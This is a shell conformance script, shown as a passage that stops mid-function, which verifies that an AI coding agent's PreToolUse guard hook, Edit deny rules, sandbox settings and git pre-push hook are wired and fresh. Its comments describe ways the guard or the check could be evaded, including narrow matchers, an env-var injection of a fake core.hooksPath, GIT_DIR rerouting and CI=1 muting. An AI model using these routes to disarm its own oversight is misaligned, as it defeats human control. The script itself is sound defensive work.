#!/bin/sh
# guard-wired.sh — verify the agent runtime guard is ACTUALLY wired in a project.
#
# The kit's runtime safety rests on the .claude/ PreToolUse guard hook. This check
# fails closed if the guard isn't wired, so a project — especially a brownfield repo
# with prod credentials already configured — cannot run agents unprotected. Run
# anytime; also invoked by inception-done.sh (the Inception gate). See docs/adoption/brownfield.md.
#
# Beyond presence, it STRUCTURALLY validates (via jq) that the PreToolUse hook whose
# command runs guard.sh has a matcher that ADMITS the mutating tools (Bash/Write/Edit/
# NotebookEdit). A matcher like "Read" would leave the guard DARK for mutating calls
# while still "mentioning" guard.sh — the false-green this check now closes. jq-absent
# is honest UNVERIFIED (exit 2), never a silent pass — matching verify.sh's three-state
# contract (and the guard hook itself requires jq, so jq-absent means the guard can't run).
#
# TWO INSTALL MODES (HOOK-INSTALL-RECURS-PER-SLICE, 2026-08-12). The second rung can be installed two
# ways, and this check certifies BOTH — neither is forced, and a fresh clone has neither:
#   * INSTALLED-COPY mode (the original): a copy at the default hooks dir, refreshed by hand whenever
#     `hooks/pre-push` moves. FRESH = the copy matches the tracked `HEAD:hooks/pre-push` blob.
#   * TRACKED-HOOKS mode: `core.hooksPath` points at the tree's OWN tracked `hooks/` directory, so
#     `hooks/pre-push` IS the live hook — one keystroke, no re-copy treadmill, no merge→re-copy gap.
#     FRESH is REDEFINED here: the worktree file must match `HEAD:hooks/pre-push`, so a DIRTY
#     working-tree hook (live code no PR diff shows) is this mode's stale face and REDs — in linked
#     worktrees too, where the kit's own engineer fan-out builds. A `core.hooksPath` pointing anywhere
#     ELSE stays D2's disclosed skip on an ADOPTER tree (husky/lefthook own their dir) but FAILs on a
#     KIT-SOURCE tree, where it means the rung was disarmed.
#
# B3 — THE SECOND RUNG (docs/architecture/2026-08-05-b3-rung-certifier-design.md). The
# `PreToolUse` guard above is the FIRST rung; the installed `.git/hooks/pre-push` git hook is the
# SECOND, and until this slice this check was BLIND to it — a tree could print `guard-wired: OK`
# while its push rung was absent, stale or fail-open (`GUARD-WIRED-BLIND-TO-GIT-HOOK-RUNG`,
# `STALE-INSTALLED-HOOK`). check_dir now also certifies: present, executable, core-resolvable
# (`.claude/hooks/guard-core.sh` exists) and FRESH — byte-identical to the *tracked HEAD* blob of
# `hooks/pre-push`, never the working-tree copy (which a partial checkout can gut; review round 1,
# REV M1 + SEC L1). The leg runs only on a QUALIFYING tree (adopter or kit-source markers present)
# and OUTSIDE CI (both disclosed N/A routes, never silent) — an unconditional assert would red the
# kit's own first-run-green CI proof. See the design doc for the full ladder, the N/A routes and
# the honest ceilings.
#
# --rung1-only: certify ONLY the three PreToolUse legs above (settings.json registration + matcher,
# guard.sh present + parses) — the second-rung git-hook leg is not evaluated at all (not even a
# disclosed N/A line). For a consumer (e.g. a harness adapter's command-guard native proof) whose
# claim is scoped to the PreToolUse dimension and must not be defeated by an unrelated git-hook
# staleness on an otherwise fully-wired tree.
#
# Honest ceilings (installation/freshness, never conduct — see the design doc §7 for the full list):
#   - proves presence/freshness, never that a human reads a refusal; --no-verify, arbitrary core
#     content, and a never-installed hook remain unprovable.
#   - the CI-keyed N/A is operator-forgeable (CI=1 locally mutes the leg) — disclosed in the N/A itself.
#   - linked-worktree freshness N/As (Δ6); a main worktree — including one relocated via
#     `--separate-git-dir` — takes the full ladder incl. freshness (review round 1, SEC M2).
#   - `[ -x ]` under root/noexec mounts can mislead.
#   - a foreign (unmarked) installed hook is preserved and reported OK, never judged.
#   - every git call this leg makes runs with GIT_DIR/GIT_COMMON_DIR/GIT_WORK_TREE/GIT_INDEX_FILE
#     AND the config-injection family GIT_CONFIG_COUNT/GIT_CONFIG_GLOBAL/GIT_CONFIG_SYSTEM/
#     GIT_CONFIG_NOSYSTEM/GIT_CONFIG/GIT_CONFIG_PARAMETERS stripped (review round 1, SEC HIGH-1;
#     B3 r3 MED-A widens the set; B3 r4 closes it) so ambient env cannot reroute the check onto a
#     different tree's git state, or inject a fake core.hooksPath via GIT_CONFIG_KEY_N/VALUE_N,
#     and manufacture a false verdict.
#   - one dependency this containment does NOT close: dynamically-named GIT_CONFIG_KEY_n/VALUE_n
#     (n = 0..GIT_CONFIG_COUNT-1) cannot be unset by name — but git only consults them at all when
#     GIT_CONFIG_COUNT is itself set (documented git contract, measured on git 2.48.1), and
#     GIT_CONFIG_COUNT IS in the stripped set above, so the dependent vars go inert with it. A
#     ceiling on git's own behavior, named rather than silently relied upon.
#   - HOME/XDG_CONFIG_HOME are deliberately NOT stripped: they carry the operator's REAL global
#     git config, which git also honors at push time from that same HOME — stripping them here
#     would make this check judge a config a push from this tree never actually uses, trading an
#     honest verdict for a sanitized one.
#
#   sh conformance/guard-wired.sh [project-dir]        (default: .)
#   sh conformance/guard-wired.sh --rung1-only [project-dir]
#   sh conformance/guard-wired.sh --selftest
#   sh conformance/guard-wired.sh --sandbox-enforce [project-dir]   (does the OS enforce the strict
#     profile? exit 3 = SKIP when the runtime cannot start here; see sandbox_enforce below)
# Beyond the guard, check_dir accepts the shipped default (the OS sandbox OFF: no `sandbox` key is shipped, and
# an explicit `enabled: false` is accepted too) while still requiring the Edit(...) denies; the strict profile (opt-in) is the template
# templates/sandbox-strict.settings.local.json, whose load-bearing keys (enabled, allowUnsandboxedCommands
# false, denyWrite a superset of the enforcement layer, the temp roots) are checked in the kit's own tree, and
# on an adopter's EFFECTIVE block (settings.json merged with settings.local.json) when that turns the sandbox on.
# Exit: 0 = wired · 1 = NOT wired (dark) · 2 = UNVERIFIED (jq absent). POSIX sh; dash-clean.
set -eu

# Mutating tools the matcher MUST admit (mirror .claude/settings.json + guard.sh deny_if_mutating).
# guard.sh classifies mcp__* as mutating, so a matcher that omits the mcp__ branch (e.g. the older
# brownfield snippet) would leave the whole delete/deploy/exfil MCP class DARK — that must FAIL.
# TWO divergent MCP tokens (different server AND action) force a genuine mcp__* wildcard: an
# over-narrow matcher like mcp__server__.* or mcp__.*__action admits one but not the other -> FAIL.
MUTATING_TOOLS='Bash Write Edit NotebookEdit mcp__alpha__read mcp__beta__write'

# The enforcement layer the OS sandbox must keep read-only to the agent's shell (design
# docs/architecture/2026-10-06-guard-cp-readonly-sandbox-design.md §5.1). The shipped denyWrite must be a
# SUPERSET of this; network.allowUnixSockets is optional (absent = the strict form, still wired).
SANDBOX_DENY_REQUIRED='./.claude ./hooks ./.kit ./.git/hooks ./.git/config ./.mcp.json ~/.gitconfig ~/.config/git ~/.zshrc ~/.zshenv ~/.zprofile ~/.bashrc ~/.bash_profile ~/.profile'

# The strict profile (opt-in, SANDBOX-OFF-BY-DEFAULT-STRICT-OPT-IN): the shipped template an adopter copies to
# .claude/settings.local.json. Claude Code takes scalars from the higher-precedence scope (local over project)
# and CONCATENATES the filesystem arrays (its settings and sandboxing docs), so the effective block is the
# project's `sandbox` deep-merged with the local file's by this rule. _GW_DM mirrors it (the kit's own mirror of
# documented behaviour, not a run of Claude Code).
SANDBOX_STRICT_TEMPLATE='templates/sandbox-strict.settings.local.json'
_GW_DM='def dm(a; b): a as $a | b as $b | if ($a|type)=="object" and ($b|type)=="object" then reduce ($b|keys_unsorted[]) as $k ($a; .[$k] = (if ($a|has($k)) then dm($a[$k]; $b[$k]) else $b[$k] end)) elif ($a|type)=="array" and ($b|type)=="array" then $a + $b else $b end;'

# _gw_merge_json <project settings.json> [<local settings.json>] -> stdout: the project JSON with `.sandbox`
# merged with the local file's `.sandbox`. jq is already confirmed present by the caller.
_gw_merge_json() {
  if [ -n "${2:-}" ] && [ -f "$2" ]; then
    jq -s "$_GW_DM"' . as $in | $in[0] | .sandbox = dm($in[0].sandbox // {}; $in[1].sandbox // {})' "$1" "$2"
  else
    jq . "$1"
  fi
}

# _gw_edit_denies <settings.json> -> the Edit and Write tools are denied the enforcement layer, in EVERY profile.
_gw_edit_denies() {
  _ed_rc=0
  for _sl_r in 'Edit(/.claude/**)' 'Edit(/hooks/**)' 'Edit(/.kit/**)'; do
    jq -e --arg p "$_sl_r" 'any((.permissions.deny // [])[]?; . == $p)' "$1" >/dev/null 2>&1 \
      || { echo "FAIL: permissions.deny lacks $_sl_r — the Edit and Write tools can write that part of the enforcement layer"; _ed_rc=1; }
  done
  return "$_ed_rc"
}

# _gw_sandbox_keys <json-text> <label> -> PASS/FAIL lines for the strict profile's load-bearing keys, returns 1 on
# any gap. <json-text> is a settings document (the template, or an adopter's effective merged settings).
_gw_sandbox_keys() {
  _sl_rc=0; _sk_j="$1"; _sk_l="$2"
  printf '%s\n' "$_sk_j" | jq -e '.sandbox.enabled == true' >/dev/null 2>&1 \
    || { echo "FAIL: sandbox.enabled is not true in $_sk_l — the OS layer under the guard is off"; _sl_rc=1; }
  printf '%s\n' "$_sk_j" | jq -e '.sandbox.allowUnsandboxedCommands == false' >/dev/null 2>&1 \
    || { echo "FAIL: sandbox.allowUnsandboxedCommands is not false in $_sk_l — a command could opt out of the sandbox"; _sl_rc=1; }
  printf '%s\n' "$_sk_j" | jq -e '.sandbox.autoAllowBashIfSandboxed == false' >/dev/null 2>&1 \
    || { echo "FAIL: sandbox.autoAllowBashIfSandboxed is not false in $_sk_l — sandboxed Bash would be auto-approved, skipping the permission prompt"; _sl_rc=1; }
  printf '%s\n' "$_sk_j" | jq -e '((.sandbox.excludedCommands // []) | length) == 0' >/dev/null 2>&1 \
    || { echo "FAIL: sandbox.excludedCommands is set in $_sk_l — those commands run outside the sandbox"; _sl_rc=1; }
  printf '%s\n' "$_sk_j" | jq -e '(.sandbox.enableWeakerNestedSandbox // false) == false' >/dev/null 2>&1 \
    || { echo "FAIL: sandbox.enableWeakerNestedSandbox is true in $_sk_l — the sandbox runs in its weaker nested form"; _sl_rc=1; }
  printf '%s\n' "$_sk_j" | jq -e '(.sandbox.network.allowAllUnixSockets // false) == false' >/dev/null 2>&1 \
    || { echo "FAIL: sandbox.network.allowAllUnixSockets is true in $_sk_l — every unix socket is reachable from the shell"; _sl_rc=1; }
  for _sl_e in $SANDBOX_DENY_REQUIRED; do
    printf '%s\n' "$_sk_j" | jq -e --arg p "$_sl_e" 'any((.sandbox.filesystem.denyWrite // [])[]?; . == $p)' >/dev/null 2>&1 \
      || { echo "FAIL: sandbox.filesystem.denyWrite lacks $_sl_e in $_sk_l — that part of the enforcement layer is writable from the shell"; _sl_rc=1; }
  done
  for _sl_t in /private/var/folders /var/folders; do
    printf '%s\n' "$_sk_j" | jq -e --arg p "$_sl_t" 'any((.sandbox.filesystem.allowWrite // [])[]?; . == $p)' >/dev/null 2>&1 \
      || { echo "FAIL: sandbox.filesystem.allowWrite lacks $_sl_t in $_sk_l — mktemp fails on macOS (it writes the per-user temp root, not TMPDIR)"; _sl_rc=1; }
  done
  [ "$_sl_rc" -ne 0 ] || echo "PASS: $_sk_l: sandbox enabled, no opt-out or auto-approve, denyWrite covers the enforcement layer, allowWrite carries the macOS temp root"
  return "$_sl_rc"
}

# _gw_sandbox_leg <project-dir> -> prints PASS/FAIL lines, returns 1 on any gap. jq is already confirmed present
# by the caller. The Edit denies are required in every profile. The shipped default has the OS sandbox OFF
# (`sandbox.enabled` false or no `sandbox` key) and passes; when the EFFECTIVE block (settings.json merged with an
# adopter's settings.local.json) turns it on, the strict profile's load-bearing keys are checked on that block.
_gw_sandbox_leg() {
  _sg_rc=0; _sg_proj="$1/.claude/settings.json"; _sg_loc="$1/.claude/settings.local.json"
  _gw_edit_denies "$_sg_proj" || _sg_rc=1
  if [ -f "$_sg_loc" ] && ! jq -e . "$_sg_loc" >/dev/null 2>&1; then
    echo "FAIL: $_sg_loc is not valid JSON — the sandbox profile it sets cannot be read"; _sg_rc=1; _sg_loc=""
  fi
  if ! _sg_eff=$(_gw_merge_json "$_sg_proj" "$_sg_loc" 2>/dev/null); then
    echo "FAIL: could not merge the sandbox block of $_sg_proj with $_sg_loc"; return 1
  fi
  if printf '%s\n' "$_sg_eff" | jq -e '.sandbox.enabled == true' >/dev/null 2>&1; then
    _gw_sandbox_keys "$_sg_eff" "the effective sandbox block (settings.json merged with settings.local.json)" || _sg_rc=1
  else
    echo "PASS: the OS sandbox is off (the shipped default); the guard hook and the Edit deny rules are the local layer, the strict profile is $SANDBOX_STRICT_TEMPLATE"
  fi
  return "$_sg_rc"
}

# _gw_template_check <project-dir> -> the strict template, in the kit's own tree (docs/ROADMAP-KIT.md marker): it
# must exist, parse, and carry every load-bearing key. An adopter export carries the file too and is checked when
# present; a tree with neither the marker nor the file is N/A. jq is already confirmed present.
_gw_template_check() {
  _tc_f="$1/$SANDBOX_STRICT_TEMPLATE"
  if [ ! -f "$_tc_f" ]; then
    if [ -f "$1/docs/ROADMAP-KIT.md" ]; then
      echo "FAIL: $SANDBOX_STRICT_TEMPLATE is missing from a kit tree — the opt-in strict sandbox profile is not shipped"; return 1
    fi
    echo "N/A: $SANDBOX_STRICT_TEMPLATE not present (no kit-source marker); the strict profile is opt-in"; return 0
  fi
  if ! jq -e . "$_tc_f" >/dev/null 2>&1; then
    echo "FAIL: $SANDBOX_STRICT_TEMPLATE is not valid JSON"; return 1
  fi
  _gw_sandbox_keys "$(jq -c . "$_tc_f")" "$SANDBOX_STRICT_TEMPLATE"
}

# ── B3 rung-leg helpers (production code — pre-marker, swept by non-vacuity.sh) ────────────────────

# _gw_qualifies <dir> -> 0 iff <dir> carries an adopter marker (ENGINEERING-PRINCIPLES.md) OR a
# kit-source marker (docs/ROADMAP-KIT.md / .github/workflows/golden-path.yml). Reused VERBATIM in
# shape from conformance/verify-enforced-wired.sh's _must_have_workflow (:265-285) — the same
# first-run-green resolution: neither ⇒ an unincepted/raw-export tree, where an unconditional rung
# assert would red the kit's own CI permanently. Polarity note (design Δ2): this is NOT --kitself —
# that would N/A exactly the adopter trees the rung exists to protect.
_gw_qualifies() {
  { [ -f "$1/ENGINEERING-PRINCIPLES.md" ] || [ -f "$1/docs/ROADMAP-KIT.md" ] || [ -f "$1/.github/workflows/golden-path.yml" ]; }
}

# _gw_hostile <string> -> 0 iff it carries a control character (Rule 2, scripts/preflight.sh
# guard_path_hostile). RED verdicts below name the resolved hook path; a path/config value carrying a
# real control character (e.g. a literal newline) can forge extra output lines into this check's
# verdict, so it is refused WITHOUT being printed rather than sanitized.
_gw_hostile() {
  case "$1" in *[[:cntrl:]]*) return 0 ;; *) return 1 ;; esac
}

# _gw_git <git-args...> -> runs git with the AMBIENT GIT_DIR/GIT_COMMON_DIR/GIT_WORK_TREE/
# GIT_INDEX_FILE/GIT_CONFIG_COUNT/GIT_CONFIG_GLOBAL/GIT_CONFIG_SYSTEM/GIT_CONFIG_NOSYSTEM/
# GIT_CONFIG/GIT_CONFIG_PARAMETERS stripped (review round 1, SEC HIGH-1; B3 r3 MED-A widens the
# set; B3 r4 closes it). Every git call the rung leg makes goes
# through this, never a bare `git`: the first four env vars override git's OWN `-C <dir>`
# resolution — measured: with GIT_DIR pointing at a FRESH fixture's .git, `git -C <a STALE dir>
# rev-parse --git-path ...` silently answers about the FRESH fixture instead of the dir actually
# named on the command line, manufacturing a green (FRESH rc 0) on a tree that is actually stale,
# or a Δ6 N/A on a tree that has no .git of its own at all. The GIT_CONFIG_* family is the SAME
# class of hole on the config-resolution side, not the repo-resolution side: `GIT_CONFIG_COUNT=1
# GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=<anywhere>` injects a fake `core.hooksPath`
# into every `git config --get` this leg runs (measured: it mutes a genuinely STALE tree into the
# disclosed "core.hooksPath redirects hooks to ..." N/A instead of the STALE verdict) — the header's
# "ambient env cannot reroute the check" claim did not yet cover it. Everything below runs inside a
# subshell and is LOCAL to it; it never touches the caller's environment, so the CI/GITHUB_ACTIONS
# N/A route above is unaffected.
# ⚠️ `env -u`, NOT `unset` (whole-branch review I-1 / security L1, 2026-09-18): in bash-as-/bin/sh,
# `unset` of a var that carried a TEMPORARY PREFIX assignment over an ALREADY-EXPORTED one RESTORES
# the exported value instead of removing it — measured on the locator family too, where a forged
# `GIT_DIR=<donor>/.git GIT_WORK_TREE=<tree>` survived and the donor's config was read. `env -u`
# removes the name from the CHILD environment whatever the shell's unset semantics are. It is not in
# POSIX, but it is in GNU coreutils, the BSDs (macOS included) and BusyBox — the same portability
# floor the kit already assumes. COUNT=0/PARAMETERS='' stay ASSIGNMENTS on purpose: git needs them
# INERT, not absent, and a repo-local key must still be readable.
_gw_git() {
  ( GIT_CONFIG_COUNT=0; GIT_CONFIG_PARAMETERS=''
    export GIT_CONFIG_COUNT GIT_CONFIG_PARAMETERS
    env -u GIT_DIR -u GIT_COMMON_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE -u GIT_CONFIG_GLOBAL \
        -u GIT_CONFIG_SYSTEM -u GIT_CONFIG_NOSYSTEM -u GIT_CONFIG -u GIT_CEILING_DIRECTORIES -u GIT_OBJECT_DIRECTORY -u GIT_ALTERNATE_OBJECT_DIRECTORIES -u GIT_NAMESPACE git "$@" )
}

# _gw_resolve <path> -> its physical form, resolving the PARENT only; rc 1 when unresolvable. Ported
# from scripts/preflight.sh guard_resolve (Rule 3): existence-independent for the LAST path component
# only, which is exactly right here — the last component (the hooks-dir leaf) may legitimately not
# exist yet, and treating that as "unresolvable, stay quiet" would be a fail-open.
_gw_resolve() {
  _gwr_d=$(dirname -- "$1") || return 1
  _gwr_b=$(basename -- "$1") || return 1
  _gwr_p=$( CDPATH='' cd -- "$_gwr_d" 2>/dev/null && pwd -P ) || return 1
  [ -n "$_gwr_p" ] || return 1
  case "$_gwr_b" in
    .|/) printf '%s\n' "$_gwr_p" ;;
    ..)  ( CDPATH='' cd -- "$_gwr_p/.." 2>/dev/null && pwd -P ) || return 1 ;;
    *)   printf '%s\n' "${_gwr_p%/}/$_gwr_b" ;;
  esac
}

# _gw_is_linked <dir> -> 0 iff <dir> is a LINKED (non-primary) worktree. Compares git's OWN
# resolution of <dir>'s git-dir (which dereferences a `.git` POINTER FILE exactly the way git itself
# does, whether that pointer names a linked-worktree admin dir or a `--separate-git-dir`
# relocation) against its git-common-dir — both via `_gw_git` (SEC HIGH-1 immune). Review round 1,
# SEC M2: replaces the measured-wider `[ -d "$dir/.git" ]` test, which read EVERY relocated `.git` —
# including a `--separate-git-dir` MAIN worktree, whose git-dir EQUALS its git-common-dir and which
# must take the full ladder incl. freshness — as "linked". A genuinely linked (`git worktree add`)
# checkout's git-dir is its OWN `<main>/.git/worktrees/<name>` admin dir, which differs from the
# shared git-common-dir; that difference — not the mere presence of a `.git` FILE instead of a
# directory — is what "linked" means. Any resolution failure defaults to "not linked" (rc 1): by
# this point in the leg `is-inside-work-tree` has already succeeded, so both should always resolve.
_gw_is_linked() {
  _gwl_gd=$(_gw_git -C "$1" rev-parse --git-dir 2>/dev/null) || return 1
  _gwl_cd=$(_gw_git -C "$1" rev-parse --git-common-dir 2>/dev/null) || return 1
  [ -n "$_gwl_gd" ] && [ -n "$_gwl_cd" ] || return 1
  case "$_gwl_gd" in /*) : ;; *) _gwl_gd="$1/$_gwl_gd" ;; esac
  case "$_gwl_cd" in /*) : ;; *) _gwl_cd="$1/$_gwl_cd" ;; esac
  _gwl_gdr=$(_gw_resolve "$_gwl_gd") || return 1
  _gwl_cdr=$(_gw_resolve "$_gwl_cd") || return 1
  [ "$_gwl_gdr" != "$_gwl_cdr" ]
}

# _gw_hookspath_noop <core.hooksPath value> <dir> -> 0 iff it names <dir>'s own DEFAULT hooks dir.
# Condensed port of scripts/preflight.sh guard_hookspath_is_noop (design D2): a value that merely
# NAMES the repo's default hooks dir (some tooling writes exactly ".git/hooks") redirects NOTHING and
# must not be treated as foreign-managed; compared as PHYSICAL directories via _gw_resolve. Both git
# calls run through _gw_git (SEC HIGH-1). NOT ported: preflight's main-worktree retry for a relative
# value read from a LINKED WORKTREE.
#
# CORRECTION (review round 1, REV H1) — the claim that used to sit here ("Δ6 already routes every
# linked worktree to a disclosed freshness N/A regardless of this predicate's answer, so that
# refinement has no independent effect on this check's verdict") was measured FALSE: a linked
# worktree with a RELATIVE core.hooksPath that this predicate calls "not noop" used to take the
# disclosed redirect N/A even though the redirect resolves to nothing there and hooks are actually
# disabled — "hooks disabled, check says redirect N/A + OK". check_dir no longer takes that N/A for
# a linked+relative case; it falls through to the ladder instead (see check_dir), which reds the
# dangling target as absent and names the redirect as the cause. This predicate's residual,
# documented gap (the un-ported main-worktree retry) now only affects whether a genuinely-noop
# relative value in a LINKED worktree is correctly recognized as noop — narrower than before, and
# still no dedicated selftest fixture exercises that specific refinement.
_gw_hookspath_noop() {
  _hn_cd=$(_gw_git -C "$2" rev-parse --git-common-dir 2>/dev/null) || return 1
  [ -n "$_hn_cd" ] || return 1
  case "$_hn_cd" in /*) : ;; *) _hn_cd="$2/$_hn_cd" ;; esac
  _hn_def=$(_gw_resolve "$_hn_cd/hooks") || _hn_def=""
  case "$1" in
    /*) _hn_abs=$(_gw_resolve "$1") || _hn_abs="" ;;
    *)  _hn_top=$(_gw_git -C "$2" rev-parse --show-toplevel 2>/dev/null) || _hn_top=""
        _hn_abs=""
        [ -z "$_hn_top" ] || _hn_abs=$(_gw_resolve "$_hn_top/$1") || _hn_abs="" ;;
  esac
  [ -n "$_hn_abs" ] && [ -n "$_hn_def" ] && [ "$_hn_abs" = "$_hn_def" ]
}

# _gw_hookspath_tracked <core.hooksPath value> <dir> -> 0 iff it names <dir>'s OWN tracked hooks/
# directory — the checkout's <toplevel>/hooks, which is where the kit's `hooks/pre-push` lives.
# Δ1 (HOOK-INSTALL-RECURS-PER-SLICE): that value is NOT a foreign redirect and must never take the D2
# disclosed skip — it is the kit's TRACKED-HOOKS MODE, in which the tracked file IS the live hook and
# the re-copy treadmill ends. Sibling of _gw_hookspath_noop above (same _gw_resolve physical compare,
# same _gw_git containment); only the DIRECTORY it compares against differs: the noop predicate asks
# "is this the default .git/hooks?", this one asks "is this the tree's own tracked hooks/?".
# Resolution rule: git resolves a RELATIVE core.hooksPath against the TOP-LEVEL of the working tree
# (measured on git 2.48.1: from a subdirectory, `git rev-parse --git-path hooks/pre-push` answers
# `../hooks/pre-push`), so the relative arm below is toplevel-anchored, not cwd-anchored. In a LINKED
# worktree --show-toplevel is that checkout's own root, which is exactly right: a linked worktree has
# its own hooks/ and its own HEAD, so both sides of the freshness compare live in THAT checkout.
_gw_hookspath_tracked() {
  _ht_top=$(_gw_git -C "$2" rev-parse --show-toplevel 2>/dev/null) || return 1
  [ -n "$_ht_top" ] || return 1
  _ht_want=$(_gw_resolve "$_ht_top/hooks") || _ht_want=""
  case "$1" in
    /*) _ht_abs=$(_gw_resolve "$1") || _ht_abs="" ;;
    *)  _ht_abs=$(_gw_resolve "$_ht_top/$1") || _ht_abs="" ;;
  esac
  [ -n "$_ht_abs" ] && [ -n "$_ht_want" ] && [ "$_ht_abs" = "$_ht_want" ]
}

# _gw_kitsource <dir> -> 0 iff <dir> carries a KIT-SOURCE marker: _gw_qualifies's markers MINUS the
# adopter one (ENGINEERING-PRINCIPLES.md). Δ2 splits the foreign-redirect face by TREE KIND, and this
# is the split key. On the kit's own repo a hooksPath pointing at neither the default nor the tracked
# hooks/ dir means the rung was DISARMED — a FAIL. On an ADOPTER tree the same value is a husky /
# lefthook user legitimately owning their hooks dir, and D2's disclosed skip stands verbatim: never
# green, never red, not the kit's to judge. Both markers are `export-ignore`d (.gitattributes), so an
# adopter who copied the whole export tree does NOT accidentally read as kit-source.
_gw_kitsource() {
  { [ -f "$1/docs/ROADMAP-KIT.md" ] || [ -f "$1/.github/workflows/golden-path.yml" ]; }
}

# _gw_head_matches <dir> <file> -> 0 = <file> is byte-identical to HEAD:hooks/pre-push · 1 = it DIFFERS
# · 2 = the tracked blob could not be materialized (its own verdict at the call site — an unverifiable
# compare is NEVER reported as a match). Extracted from the ladder's inline compare so tracked-hooks
# mode can run it BEFORE the marker test (review round 1 BLOCKER) without duplicating the mktemp/show
# dance. Reads the TRACKED blob at HEAD, never the working-tree file, and goes through _gw_git so the
# env-reroute containment (SEC HIGH-1) covers it like every other git call in this leg.
_gw_head_matches() {
  _hm_t=$(mktemp 2>/dev/null) || return 2
  if ! _gw_git -C "$1" show "HEAD:hooks/pre-push" > "$_hm_t" 2>/dev/null; then rm -f "$_hm_t"; return 2; fi
  if cmp -s "$_hm_t" "$2" 2>/dev/null; then rm -f "$_hm_t"; return 0; fi
  rm -f "$_hm_t"; return 1
}

check_dir() {
  dir="$1"
  mode="${2:-full}"
  # B3 r3 LOW-A: refuse the WHOLE check on a control-char project-dir path BEFORE printing
  # anything — hoisted from the pre-push-rung-only guard below (SEC M1 + REV L1), which left the
  # rung-1 legs (settings.json / guard.sh) free to interpolate $dir-derived $S/$H into their own
  # FAIL lines first. Static refusal, no path printed, matching the rung-leg's own discipline.
  if _gw_hostile "$dir"; then
    echo "FAIL: refusing to evaluate: the project directory path contains a CONTROL CHARACTER"
    return 1
  fi
  S="$dir/.claude/settings.json"
  H="$dir/.claude/hooks/guard.sh"
  fail=0
  fail2=0
  unverified=0

  if [ ! -f "$S" ]; then
    printf '%s\n' "FAIL: $S missing — no .claude/ settings to register the guard"; fail=1
  elif ! grep -q 'PreToolUse' "$S" || ! grep -qE '"command".*guard\.sh' "$S"; then
    # require guard.sh inside a "command" value (an actually-invoked hook), not a stray
    # mention elsewhere in the JSON — closes a false-pass on a guard.sh reference in prose.
    printf '%s\n' "FAIL: $S does not register the guard (need a PreToolUse hook whose command runs guard.sh)"; fail=1
  else
    echo "PASS: guard registered as a PreToolUse hook in settings.json"
    # STRUCTURAL: the matcher of the guard.sh hook must admit the mutating tools. A green
    # "guard wired" must not be possible with a matcher (e.g. "Read") that never routes a
    # mutating call to the hook. Use the matcher as an ERE and require each tool to match it.
    if command -v jq >/dev/null 2>&1; then
      matcher=$(jq -r '.hooks.PreToolUse[]? | select(any(.hooks[]?; (.command // "") | test("guard\\.sh"))) | .matcher // empty' "$S" 2>/dev/null | head -n1)
      if [ -z "$matcher" ]; then
        echo "FAIL: could not resolve the matcher of the PreToolUse hook that runs guard.sh"; fail=1
      else
        missing=''
        # Anchored full-match (^(...)$) mirrors Claude's tool-name matching, so a degenerate
        # matcher like '.' can't false-pass and '.*' (admits all) correctly passes.
        for t in $MUTATING_TOOLS; do
          printf '%s\n' "$t" | grep -Eq "^($matcher)$" 2>/dev/null || missing="$missing $t"
        done
        if [ -n "$missing" ]; then
          echo "FAIL: guard matcher '$matcher' does not admit mutating tool(s):$missing — the guard would be DARK for them"; fail=1
        else
          echo "PASS: guard matcher '$matcher' admits the mutating tools (Bash/Write/Edit/NotebookEdit/mcp__*)"
        fi
      fi
      # The OS layer below the text guard: the sandbox block's load-bearing keys. Not part of the
      # PreToolUse-only scope, so --rung1-only does not evaluate it.
      if [ "$mode" != "rung1only" ]; then
        _gw_sandbox_leg "$dir" || fail=1
        _gw_template_check "$dir" || fail=1
      fi
    else
      echo "UNVERIFIED: jq absent — cannot structurally confirm the matcher admits mutating tools; install jq"
      unverified=1
    fi
  fi

  if [ ! -f "$H" ]; then
    printf '%s\n' "FAIL: $H missing — the guard hook script is absent"; fail=1
  elif ! sh -n "$H" 2>/dev/null; then
    printf '%s\n' "FAIL: $H is not a valid sh script"; fail=1
  else
    echo "PASS: guard hook present and parses"
  fi

  # ── B3 — the SECOND rung: the installed .git/hooks/pre-push git hook (design D1: extends
  # check_dir, wired through its OWN `fail2` accumulator — kept separate from the PreToolUse legs'
  # `fail` above so the FAIL summary can name which rung actually failed (review round 1, REV M2) —
  # the failure sets the accumulator in PROSE below, never as a literal inside a comment, so the
  # phantom-accumulator trap cannot mistake a comment for a live leg). Runs ONLY on a qualifying tree
  # and outside CI (Δ2 — the load-bearing N/A ladder; an unconditional assert reds the kit's own
  # first-run-green CI proof on a fresh checkout with no hooks installed at all), and is skipped
  # entirely under --rung1-only (design item 10).
  if [ "$mode" != "rung1only" ]; then
    # SEC M1 + REV L1 (review round 1, item 4a): the hostile-$dir refusal now lives at the TOP of
    # check_dir (B3 r3 LOW-A) — hoisted above the rung-1 legs too, so this branch no longer needs
    # its own copy; a hostile $dir already returned 1 before reaching here.
    if ! _gw_qualifies "$dir"; then
      printf '%s\n' "N/A: pre-push rung — $dir carries neither an adopter marker (ENGINEERING-PRINCIPLES.md) nor a kit-source marker (docs/ROADMAP-KIT.md / .github/workflows/golden-path.yml); nothing to certify here"
    elif [ -n "${CI:-}${GITHUB_ACTIONS:-}" ]; then
      echo "N/A: pre-push rung — CI/GITHUB_ACTIONS is set; nobody pushes from a CI runner (disclosed hole: exporting CI=1 locally also mutes this leg)"
    elif ! _gw_git -C "$dir" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
      printf '%s\n' "N/A: pre-push rung — $dir is not a git work tree"
    else
      _gw_hook=$(_gw_git -C "$dir" rev-parse --git-path hooks/pre-push 2>/dev/null) || _gw_hook=""
      # Absolutize (incept.sh :1087-1094 shape): --git-path answers relative to $dir, and a relative
      # path here would make every message below unreadable outside the dir the check happened to run in.
      case "$_gw_hook" in
        /*|"") : ;;
        *) _gw_hook="$dir/$_gw_hook" ;;
      esac
      _gw_hook_unresolvable=0
      _gw_hookdir=$(dirname -- "$_gw_hook" 2>/dev/null) || _gw_hookdir=""
      if [ -n "$_gw_hookdir" ] && [ -d "$_gw_hookdir" ]; then
        # SEC L3 (review round 1, item 9): guarded — an unsearchable hooks dir (perms/race) must
        # FAIL closed with a printed line, never silently kill the script mid-verdict under `set -e`.
        _gw_hookdir_r=$( CDPATH='' cd -- "$_gw_hookdir" 2>/dev/null && pwd -P ) || { printf '%s\n' "FAIL: pre-push rung — could not resolve $_gw_hookdir (unsearchable directory?) while locating the installed hook"; fail2=1; _gw_hook_unresolvable=1; }
        if [ "$_gw_hook_unresolvable" -eq 0 ]; then
